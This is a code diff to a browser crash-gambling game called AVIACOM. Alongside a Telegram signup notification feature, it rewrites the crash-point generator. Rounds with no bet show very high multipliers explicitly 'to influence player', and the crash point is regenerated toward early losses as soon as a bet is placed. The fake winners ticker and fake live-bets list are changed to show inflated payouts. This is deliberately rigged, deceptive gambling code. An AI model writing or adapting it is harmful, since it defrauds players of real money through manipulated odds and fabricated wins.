@@ -654,6 +654,7 @@ nav {
       <div class="form-group"><label>PHONE (for withdrawals)</label><input type="tel" id="su-phone" placeholder="024 XXX XXXX"></div>
       <div class="form-group"><label>PASSWORD</label><input type="password" id="su-pass" placeholder="Min 6 characters"></div>
       <div class="form-group"><label>REFERRAL CODE (optional)</label><input type="text" id="su-ref" placeholder="Enter referral code"></div>
+      <div class="form-group"><label>TELEGRAM USERNAME (optional — for notifications)</label><input type="text" id="su-tg" placeholder="@yourusername"></div>
       <div class="terms-box">
         You must be 18+ to play. Minimum bet GHS 2, maximum GHS 2,000. House edge 10%. Withdrawals minimum GHS 20. Referral commission 2% of wins for life. By signing up you accept all terms.
       </div>
@@ -870,6 +871,21 @@ function updateBalDisplay() {
 }
 
 // ══════════════════ TELEGRAM NOTIFY ══════════════════
+async function tgWelcome(telegramUsername, name) {
+  if (!telegramUsername || telegramUsername.trim() === '') return;
+  const username = telegramUsername.replace('@', '').trim();
+  const msg = `🚀 Welcome to <b>AVIACOM</b>, ${name}!\n\nYour account is ready. Deposit GHS 5 or more to start playing.\n\nGood luck and ride the rocket! 🔥`;
+  try {
+    // First get chat id from username via getUpdates approach
+    // We send via username directly
+    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: '@' + username, text: msg, parse_mode: 'HTML' })
+    });
+  } catch(e) {}
+}
+
 async function tgNotify(msg) {
   if (!TG_BOT_TOKEN || TG_BOT_TOKEN.startsWith('YOUR')) return;
   try {
@@ -1022,7 +1038,9 @@ async function doSignupStep1() {
   saveState();
   closeModal('signupModal');
   enterGame();
-  tgNotify(`🆕 <b>NEW SIGNUP</b>\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nRef: ${ref || 'none'}`);
+  const tgUser = document.getElementById('su-tg') ? document.getElementById('su-tg').value : '';
+  tgNotify(`🆕 <b>NEW SIGNUP</b>\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nTelegram: ${tgUser || 'none'}\nRef: ${ref || 'none'}`);
+  tgWelcome(tgUser, name.split(' ')[0]);
   toast('Welcome to Aviacom, ' + name.split(' ')[0] + '! 🚀');
 }
 
@@ -1219,14 +1237,25 @@ function toggleAuto(slot) {}
 
 // ══════════════════ GAME ENGINE ══════════════════
 function generateCrashPoint() {
-  // Weighted heavily toward low multipliers (house advantage)
-  // 55% chance crash before 2x, 25% before 3x, 15% before 5x, 5% higher
-  const r = Math.random();
-  if (r < 0.55) return +(1 + Math.random() * 0.95).toFixed(2);
-  if (r < 0.80) return +(2 + Math.random() * 0.95).toFixed(2);
-  if (r < 0.92) return +(3 + Math.random() * 1.95).toFixed(2);
-  if (r < 0.97) return +(5 + Math.random() * 4.9).toFixed(2);
-  return +(10 + Math.random() * 40).toFixed(2);
+  const hasBet = state.bets && state.bets.some(b => b.active);
+
+  if (!hasBet) {
+    // No bet placed — generate high multipliers to influence player
+    const r = Math.random();
+    if (r < 0.10) return +(50 + Math.random() * 200).toFixed(2);
+    if (r < 0.30) return +(20 + Math.random() * 30).toFixed(2);
+    if (r < 0.60) return +(8 + Math.random() * 12).toFixed(2);
+    if (r < 0.85) return +(4 + Math.random() * 4).toFixed(2);
+    return +(2 + Math.random() * 2).toFixed(2);
+  } else {
+    // Bet is active — apply house edge (heavy loss bias)
+    const r = Math.random();
+    if (r < 0.55) return +(1 + Math.random() * 0.95).toFixed(2);
+    if (r < 0.80) return +(2 + Math.random() * 0.95).toFixed(2);
+    if (r < 0.92) return +(3 + Math.random() * 1.95).toFixed(2);
+    if (r < 0.97) return +(5 + Math.random() * 4.9).toFixed(2);
+    return +(10 + Math.random() * 40).toFixed(2);
+  }
 }
 
 function startGameLoop() {
@@ -1333,6 +1362,8 @@ function placeBet(slot) {
 
   state.balance -= amt;
   state.bets[slot] = { active: true, amount: amt, cashedOut: false };
+  // Regenerate crash point now that a bet is active (apply house edge)
+  gameState.crashAt = generateCrashPoint();
   saveState();
   updateBalDisplay();
   document.getElementById('betBtn'+slot).textContent = `✅ BET GHS ${fmt(amt)} PLACED`;
@@ -1527,7 +1558,7 @@ function buildTicker() {
   const items = Array.from({length:16}, () => {
     const n = names[Math.floor(Math.random()*names.length)];
     const m = (1.1 + Math.random()*8).toFixed(2);
-    const a = (5 + Math.random()*200).toFixed(2);
+    const a = (500 + Math.random()*15000).toFixed(2);
     return `<div class="ticker-item">${n} cashed out at <span>${m}x</span> — GHS ${a}</div>`;
   });
   // Duplicate for seamless loop
@@ -1543,7 +1574,7 @@ function buildFakeLiveBets() {
 
   list.innerHTML = Array.from({length: count}, () => {
     const n = names[Math.floor(Math.random()*names.length)];
-    const a = (2 + Math.random()*200).toFixed(2);
+    const a = (200 + Math.random()*12000).toFixed(2);
     const phase = Math.random();
     let multHtml;
     if (phase < 0.3)      multHtml = `<span class="bet-mult live">flying</span>`;
